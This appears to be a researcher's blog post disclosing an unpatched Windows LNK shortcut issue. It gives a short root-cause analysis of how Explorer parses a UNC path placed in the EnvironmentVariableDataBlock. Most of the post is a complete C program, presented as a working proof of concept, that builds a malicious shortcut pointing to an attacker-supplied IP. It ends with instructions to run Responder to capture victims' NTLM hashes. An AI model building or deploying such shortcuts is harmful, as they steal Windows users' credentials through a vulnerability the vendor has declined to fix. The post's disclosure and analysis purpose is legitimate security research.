---
layout: post
title:  "Right-Click Execution - A Tale of Windows LNK NTLM Leak"
date:   2025-04-28 10:00:00 +0800
---

# Overview
I recently identified and responsibly disclosed a potential security issue affecting Windows LNK files (shortcuts). This issue impacts multiple versions of the Windows operating system, including Windows 10 and Windows 11 up to the latest releases. Despite providing a proof of concept demonstrating the security implications, Microsoft has declined to address this vulnerability through a patch, stating it "does not meet their security bar for servicing."

Microsoft's justification centers on their Mark of the Web (MOTW) protection mechanism. According to their response, the issue I identified doesn't present a significant security risk because MOTW protections would be applied to LNK files downloaded from the internet, supposedly mitigating the exploit vector demonstrated in my proof of concept.

This situation highlights an important consideration in the security community about reliance on secondary protection mechanisms versus directly addressing underlying vulnerabilities. While MOTW does provide an additional security layer for files from untrusted sources, it raises questions about scenarios where this protection might be bypassed or when LNK files are delivered through alternative vectors that don't trigger MOTW.

---

# Root Cause Analysis
This post inherit from the previous write up on [Windows LNK - Analysis & Proof-of-Concept](https://zeifan.my/Windows-LNK/). Windows LNK files contain a security issue that allows attackers to craft malicious shortcuts that execute commands while appearing benign to users. 

The vulnerability exploration reveals an attack vector such Structure Manipulation. The exploit leverages specific bits in the LNK file structure, particularly the HasArguments flag and EnvironmentVariableDataBlock with UNC path, to control execution flow.

`EnvironmentVariableDataBlock` seems very sensitive where you have to set the `BlockSize` with 788 bytes (0x00000314) and we have to set the signature of the `EnvironmentVariableDataBlock` which is `0xA0000001`. Once we set this, we can assign the buffer size for `TargetAnsi` with 260 bytes and `TargetUnicode` with 520 bytes. 
This is where our `envPath` will be call later on when we executing the LNK and call the rest of the parameters in the `COMMAND_LINE_ARGUMENTS`. In this case we need to enable the flag `IsUnicode` in `LinkFlags`, which means our arguments are call and executed with Unicode.

It appears that the `envPath` here supports the UNC and we can simply straight call the UNC path we want. So when we assigned the variable `envUNC` to our UNC path, we have to set it when we assigned the space for `TargetUnicode`. The value for our `TargetUnicode` will be included as part of the UNC path. Technically, this code creating `EnvironmentVariableDataBlock` with its argument to UNC.

```c
    const char* envUNC = "\\\\<IP Address Here>\\c";

    DWORD envBlockSize = 0x00000314;
    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;

    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block size: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block signature: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    char ansiBuffer[260] = { 0 };
    strncpy(ansiBuffer, envUNC, 259);

    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {
        printf("Failed to write TargetAnsi: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    WCHAR unicodeBuffer[260] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, envUNC, -1, unicodeBuffer, 260) == 0) {
        printf("Failed to convert to Unicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {
        printf("Failed to write TargetUnicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
```

If we compile the program and execute the LNK builder, we would see something like this in the LNK file structure and our `EnvironmentVariableDataBlock` was assigned with UNC path:
![1](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/RCE5.png)

To understand further we need to trace the execution flow of the parsing in the Explorer context.
![2](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/RCE1.png)

Here we see Windows breaking down the UNC path into its components. The system is searching for backslash characters to separate the server name (192.168.44.128) from the share name (c). This parsing is essential for determining how to access the network resource.
These calls with the SHGDN_FORPARSING flag indicate that Windows is requesting the full parsing path for a shell item. 

![3](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/RCE2.png)
The QueryInterface call requests interface GUID {94727de2-b2ed-41b5-9eb5-0939ea9d0efc}, which corresponds to IShellFolder2. This advanced folder interface extends the basic IShellFolder interface with additional capabilities for:
- Retrieving extended property information
- Managing column details for Explorer views
- Handling custom attributes of shell items
This interface chain (IInitializeNetworkFolder → IShellFolder2) reveals how Windows builds a layered abstraction to handle network resources, with each layer adding specialized functionality.

`IInitializeNetworkFolder` is a specialized COM interface in the Windows Shell API designed specifically for handling network resources. 
This interface is part of Windows' internal architecture for representing and interacting with networked locations. It can initializes shell folder objects that represent network resources (shares, computers, printers). 
When you accessing a network resource in Explorer, the following process occurs:
- The Explorer detects that you're accessing a network path
- It then creates a shell folder object to represent this network location
- Here will initializes the object via `IInitializeNetworkFolder::Initialize()`

The initialized object then provides information back to Explorer about the network resource. `IInitializeNetworkFolder` prepares the object for both display and access.


---

# Proof of Concept

So what is happening here? When user access to a folder that has the LNK file, the Explorer will parse any files store in the folder and identify what file was that, etc. and when it successfully identify the file type e.g. LNK, it will parse the LNK and try to understand the structure of the LNK.
This is where the initialization of the file gets ready being call / execute e.g. UNC path. Then when user right-click on the LNK file, the Explorer already knew that the file has initialization to network folder. 

Here is the working proof of concept:
```c
#include <windows.h>
#include <stdio.h>

#pragma pack(1)

#pragma warning(disable:4996)

typedef struct _ShellLinkHeader {
    DWORD       HeaderSize;      
    GUID        LinkCLSID;       
    DWORD       LinkFlags;       
    DWORD       FileAttributes;  
    FILETIME    CreationTime;    
    FILETIME    AccessTime;      
    FILETIME    WriteTime;       
    DWORD       FileSize;        
    DWORD       IconIndex;       
    DWORD       ShowCommand;     
    WORD        HotKey;          
    WORD        Reserved1;       
    DWORD       Reserved2;       
    DWORD       Reserved3;       
} SHELL_LINK_HEADER, * PSHELL_LINK_HEADER;

#define HAS_LINK_TARGET_IDLIST         0x00000001
#define HAS_LINK_INFO                  0x00000002
#define HAS_NAME                       0x00000004
#define HAS_RELATIVE_PATH              0x00000008
#define HAS_WORKING_DIR                0x00000010
#define HAS_ARGUMENTS                  0x00000020
#define HAS_ICON_LOCATION              0x00000040
#define IS_UNICODE                     0x00000080
#define FORCE_NO_LINKINFO              0x00000100
#define HAS_EXP_STRING                 0x00000200
#define RUN_IN_SEPARATE_PROCESS        0x00000400
#define HAS_LOGO3ID                    0x00000800
#define HAS_DARWIN_ID                  0x00001000
#define RUN_AS_USER                    0x00002000
#define HAS_EXP_ICON                   0x00004000
#define NO_PIDL_ALIAS                  0x00008000
#define FORCE_USHORTCUT                0x00010000
#define RUN_WITH_SHIMLAYER             0x00020000
#define FORCE_NO_LINKTRACK             0x00040000
#define ENABLE_TARGET_METADATA         0x00080000
#define DISABLE_LINK_PATH_TRACKING     0x00100000
#define DISABLE_KNOWNFOLDER_TRACKING   0x00200000
#define DISABLE_KNOWNFOLDER_ALIAS      0x00400000
#define ALLOW_LINK_TO_LINK             0x00800000
#define UNALIAS_ON_SAVE                0x01000000
#define PREFER_ENVIRONMENT_PATH        0x02000000
#define KEEP_LOCAL_IDLIST_FOR_UNC      0x04000000

#pragma pack()

#define SW_SHOWNORMAL       0x00000001
#define SW_SHOWMAXIMIZED    0x00000003
#define SW_SHOWMINNOACTIVE  0x00000007

#define ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE   0xA0000001
#define CONSOLE_DATABLOCK_SIGNATURE                   0xA0000002
#define TRACKER_DATABLOCK_SIGNATURE                   0xA0000003
#define CONSOLE_PROPS_DATABLOCK_SIGNATURE             0xA0000004
#define SPECIAL_FOLDER_DATABLOCK_SIGNATURE            0xA0000005
#define DARWIN_DATABLOCK_SIGNATURE                    0xA0000006
#define ICON_ENVIRONMENT_DATABLOCK_SIGNATURE          0xA0000007
#define SHIM_DATABLOCK_SIGNATURE                      0xA0000008
#define PROPERTY_STORE_DATABLOCK_SIGNATURE            0xA0000009
#define KNOWN_FOLDER_DATABLOCK_SIGNATURE              0xA000000B
#define VISTA_AND_ABOVE_IDLIST_DATABLOCK_SIGNATURE    0xA000000C
#define EMBEDDED_EXE_DATABLOCK_SIGNATURE              0xA000CAFE

int main() {
    const char* lnkFilePath = "poc.lnk";
    HANDLE hFile;
    DWORD bytesWritten;

    hFile = CreateFileA(lnkFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create LNK file: %lu\n", GetLastError());
        return 1;
    }

    SHELL_LINK_HEADER header = { 0 };
    header.HeaderSize = 0x0000004C;

    header.LinkCLSID.Data1 = 0x00021401;
    header.LinkCLSID.Data2 = 0x0000;
    header.LinkCLSID.Data3 = 0x0000;
    header.LinkCLSID.Data4[0] = 0xC0;
    header.LinkCLSID.Data4[1] = 0x00;
    header.LinkCLSID.Data4[2] = 0x00;
    header.LinkCLSID.Data4[3] = 0x00;
    header.LinkCLSID.Data4[4] = 0x00;
    header.LinkCLSID.Data4[5] = 0x00;
    header.LinkCLSID.Data4[6] = 0x00;
    header.LinkCLSID.Data4[7] = 0x46;

    header.LinkFlags = HAS_NAME |
        HAS_ARGUMENTS |
        HAS_ICON_LOCATION |
        IS_UNICODE |
        HAS_EXP_STRING;

    header.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    SYSTEMTIME st;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &header.CreationTime);
    SystemTimeToFileTime(&st, &header.AccessTime);
    SystemTimeToFileTime(&st, &header.WriteTime);

    header.FileSize = 0;
    header.IconIndex = 0;
    header.ShowCommand = SW_SHOWNORMAL;
    header.HotKey = 0;
    header.Reserved1 = 0;
    header.Reserved2 = 0;
    header.Reserved3 = 0;

    if (!WriteFile(hFile, &header, sizeof(SHELL_LINK_HEADER), &bytesWritten, NULL)) {
        printf("Failed to write header: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    const char* description = "testing purpose";
    WORD descLen = (WORD)strlen(description);
    if (!WriteFile(hFile, &descLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write description length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideBufSize = MultiByteToWideChar(CP_ACP, 0, description, -1, NULL, 0);
    WCHAR* wideDesc = (WCHAR*)malloc(wideBufSize * sizeof(WCHAR));
    if (!wideDesc) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, description, -1, wideDesc, wideBufSize);

    if (!WriteFile(hFile, wideDesc, descLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write description: %lu\n", GetLastError());
        free(wideDesc);
        CloseHandle(hFile);
        return 1;
    }
    free(wideDesc);

    const char* calcCmd = "";
    char cmdLineBuffer[1024] = { 0 };
    int cmdLen = strlen(calcCmd);
    int fillBytes = 900 - cmdLen;

    memset(cmdLineBuffer, 0x20, fillBytes);
    strcpy(cmdLineBuffer + fillBytes, calcCmd);
    cmdLineBuffer[900] = '\0';

    WORD cmdArgLen = (WORD)strlen(cmdLineBuffer);
    if (!WriteFile(hFile, &cmdArgLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write cmd length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideCmdBufSize = MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, NULL, 0);
    WCHAR* wideCmd = (WCHAR*)malloc(wideCmdBufSize * sizeof(WCHAR));
    if (!wideCmd) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, wideCmd, wideCmdBufSize);

    if (!WriteFile(hFile, wideCmd, cmdArgLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write cmd: %lu\n", GetLastError());
        free(wideCmd);
        CloseHandle(hFile);
        return 1;
    }
    free(wideCmd);

    const char* iconPath = "path\\to\\your\\icon";
    WORD iconLen = (WORD)strlen(iconPath);
    if (!WriteFile(hFile, &iconLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write icon length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideIconBufSize = MultiByteToWideChar(CP_ACP, 0, iconPath, -1, NULL, 0);
    WCHAR* wideIcon = (WCHAR*)malloc(wideIconBufSize * sizeof(WCHAR));
    if (!wideIcon) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, iconPath, -1, wideIcon, wideIconBufSize);

    if (!WriteFile(hFile, wideIcon, iconLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write icon path: %lu\n", GetLastError());
        free(wideIcon);
        CloseHandle(hFile);
        return 1;
    }
    free(wideIcon);

    const char* envUNC = "\\\\<IP address here>\\c";

    DWORD envBlockSize = 0x00000314;
    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;

    printf("Creating Environment Variables Data Block:\n");
    printf("  Using fixed block size: 0x%08X (%lu bytes)\n", envBlockSize, envBlockSize);

    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block size: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write block size: %lu bytes written\n", bytesWritten);

    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block signature: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Wrote block signature: %lu bytes written\n", bytesWritten);

    char ansiBuffer[260] = { 0 };
    strncpy(ansiBuffer, envUNC, 259);

    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {
        printf("Failed to write TargetAnsi: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write TargetAnsi: %lu bytes written (fixed 260 bytes)\n", bytesWritten);

    WCHAR unicodeBuffer[260] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, envUNC, -1, unicodeBuffer, 260) == 0) {
        printf("Failed to convert to Unicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {
        printf("Failed to write TargetUnicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write TargetUnicode: %lu bytes written (fixed 520 bytes)\n", bytesWritten);

    CloseHandle(hFile);

    printf("LNK file created successfully: %s\n", lnkFilePath);
    printf("Command line buffer size: %d bytes\n", (int)strlen(cmdLineBuffer));

    return 0;
}
```

Once you compile the code, run the executable to generate LNK file and make sure to run `Responder` tool to capture NTLM Hash. 
![6](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/RCE6.png)

Feel free to comment / dispute if you have any thoughts / ideas on this :)

Signing off, 

@zeifan
